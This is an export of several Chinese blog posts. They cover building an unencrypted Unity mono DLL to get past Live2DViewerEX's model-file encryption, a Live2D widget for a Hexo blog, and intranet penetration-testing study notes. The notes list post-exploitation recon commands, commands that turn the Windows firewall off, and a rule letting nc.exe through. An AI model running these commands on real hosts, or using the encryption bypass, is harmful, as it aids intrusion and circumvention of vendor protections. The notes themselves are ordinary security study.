        <content type="html"><![CDATA[<p>首先我也是创建完这个blog的看板娘后发现的live2DviewerEX，突发奇想能不能将Live2DViewerEX里面的看板娘导出来，结果发现格式不一样，这里是被加密过的，于是乎就开始在网上搜索解密。在我实现过程中，网上生成mono-2.0-bdwgc.dll对我这种对于vs和dnspy不熟悉的用户有些不友好，然后下面就是我写一份比较完善的指南</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>首先可以看看Live2DViewerEX文件到底长什么样子</p><p>这里原本有三份文件</p><p><img src="https://i.postimg.cc/5N1VtyGY/1.png" alt="img"></p><p>这里的lpk文件后缀可以用zip格式打开，然后解压出来是一些bin3&#x2F;bin文件，里面包含了模型的参数配置，这里是被加密过的，而我们需要的是没被加密过的moc3&#x2F;moc文件，原理上来说，应该是Live2DViewerEX在接受了这些bin后会将其生成为moc3&#x2F;moc。</p><p>厂商会通过给mono-2.0-bdwgc.dll再做加密让我们没法直接破解它的一些逻辑，但其实我们可以自己生成一份没有加密过的mono-2.0-bdwgc.dll，来绕过厂商的限制，在Live2DViewerEX层拿到我们需要的moc文件。可以尝试hook劫持或者破译加密。网上的方法一般是破解加密，但是因为我太菜了，只做到了生成mono-2.0-bdwgc.dll，后面的我也没做。</p><p>另外提一嘴，在解压出来的文件中你可以看到两个没有后缀的文件，其实比较大的那个是模型的图的文件，另一个是模型的json配置文件，如下图</p><p><img src="https://i.postimg.cc/sxrt1Hnd/2.png" alt="img"></p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>然后我们着手去生成mono-2.0-bdwgc.dll文件</p><p>首先使用git下载官方的mono库和另一个工具库dnSpy-Unity-mono</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Unity-Technologies/mono</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dnSpy/dnSpy-Unity-mono</span><br></pre></td></tr></table></figure><p>对于<strong>master分支和dnSpy两个分支</strong>的问题，其实使用git clone 的时候已经拉下来了，只需要进去后使用git checkout切换即可。(如果这里看不懂的话，建议得去搜一下git怎么使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout dnSpy</span><br></pre></td></tr></table></figure><p><img src="https://i.postimg.cc/hGHFRtTG/3.png" alt="img"></p><p>先去下载一个.NET SDK</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载地址：https://dotnet.microsoft.com/zh-cn/download</span><br></pre></td></tr></table></figure><p>然后我们打开vs，注意不是vscode，vscode对sln生成不太好。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载网址：https://visualstudio.microsoft.com/zh-hans/vs/</span><br></pre></td></tr></table></figure><p>首先在上面clone的dnspy-unity-mono中找到umpatcher.sln，使用vs打开</p><p><img src="https://i.postimg.cc/zBWszYFF/4.png" alt="img"></p><p>我用的是上面文件夹里面的那个umpatcher.sln，不知道这个对生成有没有关系。在这里右键选择用vs打开然后双击umpatcher.sln也行</p><p><img src="https://i.postimg.cc/5ySDz5GH/5.png" alt="img"></p><p>这里点击生成就行</p><p>然后你就能在类似于这样的地址中找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xxxxx\dnSpy-Unity-mono\src\umpatcher\umpatcher\obj\Release\net48</span><br></pre></td></tr></table></figure><p>但我建议使用everything找。</p><p>查看当前的mono版本和生成时间</p><p>找到Live2DViewerEX本地文件下的lw.exe，查看版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\steam\steamapps\common\Live2DViewerEX\bin\lw</span><br></pre></td></tr></table></figure><p><img src="https://i.postimg.cc/gcVC1dJY/6.png" alt="image-20240718090921607"></p><p>那么它的小版本就是2019.4.40，它的大版本是unity-2019.4-mbe</p><p>可以在github中搜到</p><p><img src="https://i.postimg.cc/HL8Kz1R1/7.png" alt="image-20240718091211386"></p><p>打开本地的git，打开mono，使用git checkout 生成&#x2F;切换到这个mbe</p><p><img src="https://i.postimg.cc/gkGCW5X3/8.png" alt="image-20240718091433919"></p><p>然后在这里输入gitk，打开一个新的应用界面，然后在这里翻，找到你的小版本，然后点击即可</p><p><img src="https://i.postimg.cc/sXFL00CQ/9.png" alt="image-20240718091605025"></p><p>点击之后跳转出的这个玩意就是你的commit hash，记录下你的commit hash</p><p><img src="https://i.postimg.cc/dtBKZvPW/10.png" alt="image-20240718091702751"></p><p>下载一个dnspy做为文件分析器，它本来就是用于二进制逆向的一款工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/dnSpy/dnSpy/releases</span><br><span class="line">或者</span><br><span class="line">https://blog.csdn.net/aeaxea43/article/details/108632786</span><br></pre></td></tr></table></figure><p>如果dnspy提示需要下什么，就下。</p><p>然后使用dnspy打开steam下的mono-2.0-bdwgc.dll，类似于下面这个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\steam\steamapps\common\Live2DViewerEX\bin\lw\MonoBleedingEdge\EmbedRuntime</span><br></pre></td></tr></table></figure><p>然后你就能看到时间戳类似于这样，但下面这个是我新生成的。 记一下你的生成时间，比如我这里是2024&#x2F;7&#x2F;18</p><p><img src="https://i.postimg.cc/ry5Tcxh2/11.png" alt="image-20240718090517082"></p><p>这里时间戳的用处就是比较一下你和在gitk中找到的是否是一致的，如果在那个时间点左右，多少差一点没关系。如果时间跨度很大，那可能是找错了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xxx\dnSpy-Unity-mono\src\umpatcher\umpatcher\obj\Debug\net48\umpatcher.exe 2019.4.40-mbe 5c72e2513122ba54eb1dcaef03df123ca1a2809b &quot;C:\Users\90674\mono&quot; &quot;C:\Users\xxx\dnSpy-Unity-mono&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.postimg.cc/JzYVKqhZ/12.png" alt="image-20240718101202860"></p><p>这样就是成功了的</p><p>如果报错为Git working tree is not clean. Check in the modified files. (Repo: C:\Users\xxx\dnSpy-Unity-mono)</p><p>那么在git中去到dnSpy-Unity-mono下运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git status 查看有哪些改变</span><br><span class="line"></span><br><span class="line">使用git reset --hard清除</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line">git commit -m &quot;mono&quot; 提交改变</span><br></pre></td></tr></table></figure><p>然后使用git status再次查看有哪些改变如果没有了，就再尝试使用umpatcher</p><p>如果出现submodule相关问题，那么就使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule update</span><br></pre></td></tr></table></figure><p>进行更新即可</p><p>最后会生成一个unity-2019.4.40-mbe和其他东西在C:\Users\xxx\dnSpy-Unity-mono文件夹下面</p><p><img src="https://i.postimg.cc/XYY6whnn/13.png" alt="image-20240718102328988"></p><p>如果你下面没有dnSpy-Unity-mono-2019.x.sln等文件的话，可能和文件夹里mono.sln有关？这个我不太清除，你们可以看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Users\xxx\dnSpy-Unity-mono\unity-2019.4.40-mbe\msvc\mono.sln&quot;</span><br></pre></td></tr></table></figure><p>有dnSpy-Unity-mono-2019.x.sln等东西的话，可以去直接在vs中生成一下相应的dll</p><p><img src="https://i.postimg.cc/FKft6Lfq/14.png" alt="image-20240718102721723"></p><p>最后dll文件会出现在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xxx\dnSpy-Unity-mono\builds\Release\unity-2019.4.40\win64</span><br></pre></td></tr></table></figure><p>现在就完成了生成，接下了就将dll文件替换掉live2DviewerEX现有的同名文件，然后再用dnspy进行逆向即可啦&#x2F;这步我不会(悲)</p><p>参考链接：</p><p><a href="https://www.cnblogs.com/2aptx4869/p/16291513.html">Live2DViewerEX 创意工坊文件解密 - 洛绫璃 - 博客园 (cnblogs.com)</a></p><p><a href="https://chr.fan/lpk-decrypt/">Live2DViewerEX 创意工坊lpk文件分析 - 动态调试Unity程序 - α-Lyraeα-Lyrae (chr.fan)</a></p><p><a href="https://blog.csdn.net/Ricardo0012/article/details/127107350?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127107350-blog-105102733.235%5Ev43%5Epc_blog_bottom_relevance_base2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127107350-blog-105102733.235%5Ev43%5Epc_blog_bottom_relevance_base2&utm_relevant_index=1">【逆向工程】生成能够用dnSpy调试的mono-2.0-bdwgc.dll（一）-CSDN博客</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+buuterfly+Cubism5.0自定义看板娘搭建</title>
      <link href="/posts/f407262d9961/"/>
      <url>/posts/f407262d9961/</url>
      
        <content type="html"><![CDATA[<p>由于我的模型是新模型(SDK5.0&#x2F;Cubism5.0的版本)，文件格式为moc3，github上helper-llive2d是不支持这个内核版本，并且live2d-moc3，所以导致现在网上的一些教程是不匹配的，不能实现这个版本看板娘的搭建</p><p>链接如下：</p><p><a href="https://blog.csdn.net/weixin_44517301/article/details/106348887?ops_request_misc=%7B%22request_id%22:%22172065980216800178579183%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=172065980216800178579183&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-106348887-null-null.142%5Ev100%5Epc_search_result_base3&utm_term=%E4%BD%BF%E7%94%A8hexo%E7%9A%84helper-live2d&spm=1018.2226.3001.4187">Hexo添加Live2D看板娘最新教程_hexo live2d 教程-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_43868299/article/details/108949274?ops_request_misc=%7B%22request_id%22:%22172059240916800188571546%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=172059240916800188571546&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-108949274-null-null.142%5Ev100%5Epc_search_result_base3&utm_term=%E4%BD%BF%E7%94%A8hexo%E7%9A%84helper-live2d&spm=1018.2226.3001.4187">使用Hexo的helper-live2d插件自定义博客看板娘_hexo-helper-live2d-CSDN博客</a></p><p><a href="https://github.com/LitStronger/live2d-moc3">LitStronger&#x2F;live2d-moc3: live2d, 适用于加载新版moc3游戏角色模型(碧蓝航线)。附带使用例子 (github.com)</a></p><p><a href="https://blog.csdn.net/weixin_43641850/article/details/108154098">网页&#x2F;博客Hexo添加live2d游戏角色看板娘,简易添加，碧蓝航线等live2d新型游戏角色模型（moc3）_moc3放网页上-CSDN博客</a></p><p>都不太能符合这个模型，会出现类似于现在的内核版本过低导致模型无法加载的问题</p><p>这个问题是通过解决修改内核解决的</p><p>例如这个大佬的</p><p><a href="https://www.cnblogs.com/Arisf/p/14347362.html">在博客园主页添加一个Live2D moc3 - Arisf - 博客园 (cnblogs.com)</a>，但他的也不能直接用，因为他把内核保存在本地版本没随官方更新，不是5.0的，我们只需要修改这一部分就行</p><p>不嫌弃的话，可以直接用我的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/xudamu/Doro@3/bundle.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//存在我项目里的启动器的js</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cubism.live2d.com/sdk-web/cubismcore/live2dcubismcore.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    //官方的最新内核</span><br></pre></td></tr></table></figure><p>添加在</p><p><img src="https://i.postimg.cc/66Pk2t8q/image.png" alt="img"></p><p>我这个是buuterfly主题，原理上你只需要保证其能插入到你的文档中就行(头部加载)，就是个启动器和内核的js</p><p>然后再文本中插入你的canvas</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas id=&quot;live2d&quot; width=&quot;400&quot; height=&quot;400&quot; class=&quot;live2d&quot; style=&quot;position: fixed; opacity: 1; left: -110px; bottom: -135px; z-index: 99999; pointer-events: none;&quot;&gt;&lt;/canvas&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;  </span><br><span class="line">var resourcesPath = &#x27;https://cdn.jsdelivr.net/gh/Arisf0617/ATRI@v1.0/&#x27;; // 指定资源文件（模型）保存的路径，使用github的release版本，路径如下https://cdn.jsdelivr.net/gh/用户/库@版本号/资源路径</span><br><span class="line">var backImageName = &#x27;&#x27;; // 指定背景图片 ,默认为空</span><br><span class="line">var modelDir = [&#x27;ATRI&#x27;]; // 指定需要加载的模型</span><br><span class="line">initDefine(resourcesPath, backImageName, modelDir); // 初始化模型&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>我这里是将resourcepath和modeldir改了，并作一行写入bottom就行</p><p>保存然后</p><p>hexo clean;hexo g;hexo s在本地看看效果，模型加载较慢是正常现象，得等会。如果有好的方法欢迎讨论，我也想知道，别逼我求你(✿◕‿◕✿)</p><p>我这里是将模型传到了github上创建了release，就能在<a href="https://cdn.jsdelivr.net/gh/%E7%94%A8%E6%88%B7/%E5%BA%93@%E7%89%88%E6%9C%AC%E5%8F%B7/%E8%B5%84%E6%BA%90%E8%B7%AF%E5%BE%84">https://cdn.jsdelivr.net/gh/用户/库@版本号/资源路径</a>    进行访问了，这里的版本号是你创建release时加的tag</p><p>快去试试吧！</p>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxx</title>
      <link href="/posts/c76cf8828a3b/"/>
      <url>/posts/c76cf8828a3b/</url>
      
        <content type="html"><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><p>代码测试：<br>`&#96;&#96;py<br>print(“Hello”)<br>`&#96;&#96;</p><p>注意：这里因为我放在md文件中的，所以加上了\，不解析&#96;&#96;&#96;，实际测试时请去掉\。</p><p>图片测试：</p><p><img src="http://mculover666.cn/blog/20191031/R4mWMXsrRKxu.png?imageslim"></p><p>引用测试：</p><blockquote><p>这是一条引用</p></blockquote><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><p>无序列表测试：</p><ul><li>哈哈</li><li>嘿嘿</li><li>吼吼</li></ul><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4>]]></content>
      
      
      
        <tags>
            
            <tag> caosuan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试博客</title>
      <link href="/posts/d557603f916a/"/>
      <url>/posts/d557603f916a/</url>
      
        <content type="html"><![CDATA[<h1 id="超算测试第一博客"><a href="#超算测试第一博客" class="headerlink" title="超算测试第一博客"></a>超算测试第一博客</h1><h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>姓名：许</p><p>性别：男</p><p>喜好：其实挺喜欢学技术的</p><p>自我评价：还行，吼吼</p><p>github:<a href="http://www.github.com/xudamu">www.github.com/xudamu</a></p><h3 id="下面是截取的另外的笔记"><a href="#下面是截取的另外的笔记" class="headerlink" title="下面是截取的另外的笔记"></a>下面是截取的另外的笔记</h3><h1 id="内网介绍"><a href="#内网介绍" class="headerlink" title="内网介绍"></a>内网介绍</h1><p>内部局域网，可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮箱和传真通信服务等</p><p><img src="https://i.postimg.cc/TwJnHJDH/image.png" alt="img"></p><p>除了DMZ区一个web服务器或什么服务器上挖漏洞外，我们还可以，打印机、摄像头、路由器、智能电视？外来接入加入的路由器，通过流量劫持获取账号密码或者是强制分配IP都可以进入内网</p><p>钓鱼远控、提供路由器、攻击子公司、社工插U盘等都可以攻入内网</p><h2 id="工作组介绍"><a href="#工作组介绍" class="headerlink" title="工作组介绍"></a>工作组介绍</h2><p>按照不同职能对计算机进行分组</p><h4 id="加入工作组"><a href="#加入工作组" class="headerlink" title="加入工作组"></a>加入工作组</h4><p>计算机属性中找到工作组，添加即可</p><p><img src="https://i.postimg.cc/dt6wtk2P/image2.png" alt="img"></p><p><img src="https://i.postimg.cc/3w4TBtPY/image3.png" alt="img"></p><h4 id="创建工作组"><a href="#创建工作组" class="headerlink" title="创建工作组"></a>创建工作组</h4><h4 id="退出工作组"><a href="#退出工作组" class="headerlink" title="退出工作组"></a>退出工作组</h4><p><img src="https://i.postimg.cc/3w4TBtPY/image4.png" alt="img"></p><p>把下面改掉即可，改成想要的，点击确定就能创建</p><h4 id="访问工作组"><a href="#访问工作组" class="headerlink" title="访问工作组"></a>访问工作组</h4><p>点击即可</p><h4 id="工作组的优缺点"><a href="#工作组的优缺点" class="headerlink" title="工作组的优缺点"></a>工作组的优缺点</h4><p>优点：方便管理、资源分配灵活</p><p>缺点： 缺乏集中管理与控制的机制、没有集中的统一账户管理、只适合小规模用户使用</p><h2 id="域介绍"><a href="#域介绍" class="headerlink" title="域介绍"></a>域介绍</h2><p>解决上面工作组没有统一管理的缺陷，由域控制器管理域。连接域需要登录域的账号密码，而域的账号密码都在域控制器中</p><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>通常在地理位置固定的小公司中，一个域就能满足需求，但是在一个域汇内，一般有两台域控制器，一台作为DC、另一台作为备份DC(域控制器)</p><p>同时一般来说DC和DNS会是同一台服务器，这种情况会比较多</p><h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>第一个域就是父域，下面就是他的子域</p><h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>总个父域和子域就是域树</p><h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>就是多个域树</p><h3 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h3><p>。。。</p><h3 id="活动目录介绍"><a href="#活动目录介绍" class="headerlink" title="活动目录介绍"></a>活动目录介绍</h3><p>活动目录(AC&#x2F;Active Directory AD)是指域环境中提供目录服务的组件</p><p>可以在user中添加想要的权限</p><p><img src="https://i.postimg.cc/Vv1Pzm5k/image5.png" alt="img"></p><h3 id="域内权限介绍"><a href="#域内权限介绍" class="headerlink" title="域内权限介绍"></a>域内权限介绍</h3><p>这里后面都有描述的，直接将用户添加到相应的位置就可以</p><p>在创建用户的时候可以设置相关用户参数</p><p>做</p><p>账号集中管理：所有账号均存储在服务器中，方便执行命令和重置密码</p><p>软件集中管理：统一推送软件、安装网络打印机等、利用软件发布策略分发软件、可以让用户自由选择需要的软件</p><p>环境集中管理：统一客户端、iE、TCPP协议等设置。增强安全性：统一部署蛇毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等、可以监控网络，对资料进行统一管理</p><p>更可靠，更短的宕机时间：例如，利用活动目录控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设置。网络更可靠，宕机时间更短</p><p>活动目录是微软提供的统一管理基础平台，ISA、Exchange、SMS等都依赖这个平台</p><p>组里面还可以加组</p><p><img src="https://i.postimg.cc/yYtnRnXF/image6.png" alt="img"></p><p>创建组内的组来控制组内用户的管理权限</p><h4 id="域内权限详细"><a href="#域内权限详细" class="headerlink" title="域内权限详细"></a>域内权限详细</h4><h5 id="组"><a href="#组" class="headerlink" title="组"></a>组</h5><p>组是用户账号的集合、通过向组分配权限，就可以不必向每个用户分别分配权限，方便管理</p><h5 id="域本地"><a href="#域本地" class="headerlink" title="域本地"></a>域本地</h5><p>域本地成员来自林中任何域中的用户账号、全局组和通用组以及本域中的域本地组，在本域范围内可用，是权限的划分组</p><h5 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h5><p>成员来自同一域的用户账户和全局组，在林范围内可用。是用户的集合组</p><h5 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h5><p>来自于林中任意于中的用户账户、全局组和其他通用组，在全林范围内可用</p><p>DYJ为打印机</p><p><img src="https://i.postimg.cc/vZnht93C/image7.png" alt="img"></p><p><img src="https://i.postimg.cc/d1s9FfwK/image8.png" alt="img"></p><p>A-G-DL-P策略</p><p>指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分派资源权限</p><p>A表示用户账号(Account)</p><p>G表示全局组</p><p>U表示通用组</p><p>DL表示域本地组</p><p>P表示资源权限</p><h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><p>目的是将一组安全等级相同的计算机划入同一网段。该网段的计算机拥有相同的网络边界、并在网络边界上部署防火墙来实现对其他安全域的网络访问控制策略，从而对允许哪些IP地址访问此域、允许此域访问哪些IP地址和网段进行设置。这些措施将网络风险最小化，当攻击发生时，可尽可能将威胁隔离，从而降低对域内计算机的影响。</p><p><img src="https://i.postimg.cc/mg3MrSdZ/image9.png" alt="img"></p><p>多层隔离</p><p>DMZ是放在公网上的，一般DMZ是不让访问内网的，防止DMZ的服务器被打崩当跳板跳入内网中</p><h3 id="域中计算机分类"><a href="#域中计算机分类" class="headerlink" title="域中计算机分类"></a>域中计算机分类</h3><h4 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h4><p>用于管理所有网络访问，有所有的共享目录和资源。域控制器中存储了域内所有的账户和策略信息，包括安全策略、用户身份验证信息和账户信息</p><p>有多台计算机可以被指定为域控制器，以分据用光的登录、访问等操作，多个域控制器可以一起工作，自动备份用户账户和活动目录数据。这样及时部分域控制器瘫痪，访问也不会受到影响</p><h4 id="成员服务器"><a href="#成员服务器" class="headerlink" title="成员服务器"></a>成员服务器</h4><p>成员服务器是指定安装了服务器操作系统并加入了域、但是没有安装活动目录的计算机，其主要任务是提供网络资源，成员服务器的类型通常由文件服务器、应用服务器、数据库服务器、web服务器、防火墙、远程访问服务器、打印服务器</p><h4 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h4><p>域中计算机可以是安装了其他操作系统的计算机，用户利用这些计算机和域中的账户可以登录域。这些计算机被称为域中的客户机。域用户账号通过域的安全验证后，即可访问域中的各种资源</p><h4 id="独立服务器"><a href="#独立服务器" class="headerlink" title="独立服务器"></a>独立服务器</h4><p>独立服务和域没有关系，如果服务器不加入域，也不安装活动目录，称为独立服务器。独立服务器可以创建工作组、与网络中其他计算机共享资源，但不用活动目录提供的任何服务</p><p>域控制器用于有放活动目录数据库，是域中必须要有的，而其他三种计算机则不要必须要有的，也就是说，最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。当然，域中各服务器的角色是可以改变的。例如，独立服务器既可以称为域控制器，也可以加入某个域成为成员服务器</p><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>内网信息、本机信息、内网IP、内网端口、域信息、域内用户</p><p>建立在创建了内网权限后。上线CS或msf后</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h4 id="手动收集内网信息"><a href="#手动收集内网信息" class="headerlink" title="手动收集内网信息"></a>手动收集内网信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">systeminfo | findstr /B /C:&quot;名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p>查看系统体系结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p>查看安装的软件以及版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br><span class="line">powershell &quot;Get-WmiObject -class win32_product | Select-Object name,version&quot;</span><br></pre></td></tr></table></figure><p>查看本机的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p>进程信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p>启动程序信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p>计划任务信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schttasks /query /fo LIST /v</span><br><span class="line">如果上面的命令显示无法载入列资源，那么输入：chcp 437</span><br></pre></td></tr></table></figure><p>主机开机时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p>查用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">wmic useraccount get name ,SID</span><br></pre></td></tr></table></figure><p>查会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><p>查端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p>查补丁</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe <span class="keyword">get</span> Caption,Description,HotFixID,Installedon</span><br></pre></td></tr></table></figure><p>查看共享列表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share <span class="operator">/</span><span class="operator">/</span>横向移动？</span><br><span class="line">wmic share <span class="keyword">get</span> name, path,status</span><br></pre></td></tr></table></figure><p>查询路由信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><p>查看防火墙是否开启</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall <span class="keyword">show</span> state <span class="operator">/</span><span class="operator">/</span>虽然说netsh firewall已经过时了，改成了netsh advfirewall firewall <span class="keyword">show</span> state无法执行</span><br></pre></td></tr></table></figure><p>关闭防火墙</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在windows2003前：netsh firewall <span class="keyword">set</span> opmode disable</span><br><span class="line">在windows2003之后：netsh firewall <span class="keyword">set</span> opmode disable 或者 netsh advfirewall <span class="keyword">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><p>查看防火墙配置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall <span class="keyword">show</span> config</span><br></pre></td></tr></table></figure><p>修改防火墙配置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windowserver2003之前：netsh firewall <span class="keyword">add</span> allowedprogram c:\nc.exe &quot;allownc&quot; enable <span class="operator">/</span><span class="operator">/</span>指定nc.exe能连接(出防火墙)</span><br><span class="line">windowserver2003之后：netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>&quot;pass nc&quot;dir<span class="operator">=</span><span class="keyword">in</span> action<span class="operator">=</span>allow program<span class="operator">=</span>&quot;c:/nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许端口放行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall 